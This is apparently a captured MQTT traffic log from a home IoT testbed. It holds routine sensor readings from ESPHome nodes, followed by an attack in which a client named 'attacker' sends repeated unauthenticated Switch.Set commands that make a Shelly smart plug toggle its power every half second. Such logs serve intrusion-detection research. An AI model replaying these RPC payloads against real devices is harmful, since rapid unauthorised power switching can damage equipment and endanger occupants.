timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:14:48,shellyazplug-e4b323337220/online,5,false
2026-04-22T16:14:48,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:14:48,iot/dht11/status,6,online
2026-04-22T16:14:48,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:14:48,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:14:48,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:14:48,iot/mq/status,6,online
2026-04-22T16:14:48,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:14:48,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T16:14:48,iot/pir/status,6,online
2026-04-22T16:14:48,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T16:14:48,homeassistant/sensor/dht11_node/temperature/config,380,"{""sug_dsp_prc"":1,""unit_of_meas"":""°C"",""stat_cla"":""measurement"",""name"":""Temperature"",""dev_cla"":""temperature"",""stat_t"":""iot"
2026-04-22T16:14:48,homeassistant/sensor/dht11_node/humidity/config,366,"{""sug_dsp_prc"":0,""unit_of_meas"":""%"",""stat_cla"":""measurement"",""name"":""Humidity"",""dev_cla"":""humidity"",""stat_t"":""iot/dht11/"
2026-04-22T16:14:48,homeassistant/sensor/mq_node/gas_sensor/config,362,"{""sug_dsp_prc"":2,""unit_of_meas"":""V"",""stat_cla"":""measurement"",""name"":""Gas Sensor"",""dev_cla"":""voltage"",""stat_t"":""iot/mq/se"
2026-04-22T16:14:48,homeassistant/binary_sensor/pir_node/motion/config,306,"{""name"":""Motion"",""dev_cla"":""motion"",""stat_t"":""iot/pir/binary_sensor/motion/state"",""avty_t"":""iot/pir/status"",""uniq_id"":""E"
2026-04-22T16:14:48,esphome/discover/dht11_node,149,"{""ip"":""192.168.8.167"",""name"":""dht11_node"",""version"":""2026.3.2"",""mac"":""348518b90f38"",""platform"":""ESP32"",""board"":""esp32-s3"
2026-04-22T16:14:48,esphome/discover/mq_node,146,"{""ip"":""192.168.8.203"",""name"":""mq_node"",""version"":""2026.3.2"",""mac"":""348518b91934"",""platform"":""ESP32"",""board"":""esp32-s3-de"
2026-04-22T16:14:48,esphome/discover/pir_node,147,"{""ip"":""192.168.8.215"",""name"":""pir_node"",""version"":""2026.3.2"",""mac"":""348518b90f68"",""platform"":""ESP32"",""board"":""esp32-s3-d"
2026-04-22T16:14:48,shellyazplug-node/online,4,true
2026-04-22T16:14:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:14:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:14:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:14:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:14:56,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:14:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:14:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:14:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:14:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:04,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:14,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:15:44,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:15:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:15:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:15:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:15:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:15:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:15:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:15:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:15:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:16:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:16:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:16:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:16:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:16:26,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:16:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:16:39,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:16:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:16:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:16:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:16:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:16:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:16:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:16:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:16:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:16:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:16:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3364 33152.788 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3365 33153.286 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33153.28,""swi"
2026-04-22T16:17:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3366 33153.304 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3367 33153.786 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33153.78,""swi"
2026-04-22T16:17:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3368 33153.802 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3369 33154.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33154.28,""swi"
2026-04-22T16:17:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3370 33154.305 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3371 33154.786 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33154.78,""swi"
2026-04-22T16:17:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3372 33154.802 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3373 33155.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33155.28,""swi"
2026-04-22T16:17:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3374 33155.305 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3375 33155.787 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33155.78,""swi"
2026-04-22T16:17:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3376 33155.804 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3377 33156.287 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33156.28,""swi"
2026-04-22T16:17:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3378 33156.306 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3379 33156.787 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33156.78,""swi"
2026-04-22T16:17:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3380 33156.804 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3381 33157.288 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33157.29,""swi"
2026-04-22T16:17:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3382 33157.307 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3383 33157.791 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33157.79,""swi"
2026-04-22T16:17:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3384 33157.807 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3385 33158.292 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33158.29,""swi"
2026-04-22T16:17:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3386 33158.310 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3387 33158.790 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33158.79,""swi"
2026-04-22T16:17:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3388 33158.807 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:17:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:17:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:17:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3389 33159.291 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33159.29,""swi"
